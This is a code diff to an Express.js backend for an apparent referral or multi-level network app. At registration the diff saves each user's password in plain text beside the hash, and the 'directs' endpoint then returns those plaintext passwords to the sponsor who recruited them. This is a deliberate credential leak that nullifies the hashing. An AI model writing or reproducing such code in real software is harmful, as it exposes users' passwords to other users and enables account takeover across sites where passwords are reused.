@@ -273,6 +273,7 @@ app.post('/api/register', async (req, res) => {
             name,
             mobile,
             password: hashedPassword,
+            plainPassword: password,
             sponsorId: sponsor ? sponsor.memberId : null,
             role: 'member',
             isActive: false // Must be activated later
@@ -763,7 +764,7 @@ app.get('/api/network/tree/:memberId?', authMiddleware, async (req, res) => {
 app.get('/api/network/directs', authMiddleware, async (req, res) => {
     try {
         const directs = await User.find({ sponsorId: req.user.memberId })
-                                  .select('memberId name mobile joinDate isActive isGold')
+                                  .select('memberId name mobile joinDate isActive isGold plainPassword')
                                   .sort({ joinDate: -1 });
         
         const data = directs.map(user => ({
@@ -772,7 +773,8 @@ app.get('/api/network/directs', authMiddleware, async (req, res) => {
             mobile: user.mobile,
             joinDate: new Date(user.joinDate).toLocaleDateString(),
             status: user.isBlocked ? 'Blocked' : (user.isActive ? 'Active' : 'Unactivated'),
-            rank: user.isGold ? 'Gold' : 'Starter'
+            rank: user.isGold ? 'Gold' : 'Starter',
+            password: user.plainPassword || 'Hidden'
         }));
 
         res.json({ success: true, data });
